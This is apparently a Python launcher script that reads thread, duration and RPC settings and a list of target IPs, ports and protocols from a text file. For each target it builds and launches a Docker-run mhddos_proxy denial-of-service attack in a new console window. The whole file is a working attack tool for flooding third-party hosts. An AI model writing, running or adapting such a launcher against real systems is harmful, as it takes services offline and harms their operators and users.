import subprocess
from subprocess import Popen

file_name = "..\\commands\\MHDDoS_commands.txt"

file = open(file_name, "r")
number_of_parameters = 4
threads = 0
duration = 0
rpc = 0


targets = []

for i, line in enumerate(file):
    line = line.replace(' ', '').replace('\n', '')
    if i < number_of_parameters:
        if line.startswith("Threads"):
            threads = line.split(':')[1]
        elif line.startswith("Duration"):
            duration = line.split(':')[1]
        elif line.startswith("Rpc"):
            rpc = line.split(':')[1]
    else:
        current_line = line.split(':')
        targets.append([current_line[0], current_line[1].split(',')])

const_part = "docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest "

layer7 = " -t " + threads + " --rpc " + rpc + " --debug"
layer4 = " " + threads + " " + duration

for target in targets:
    ip = target[0]
    for parameters in target[1]:
        current_parameters = parameters.upper().split('/')
        port = current_parameters[0]
        tool = current_parameters[1].lower()
        command = const_part + tool + "://" + ip + ":" + port + layer7

        print(command)
        Popen(command, creationflags=subprocess.CREATE_NEW_CONSOLE)
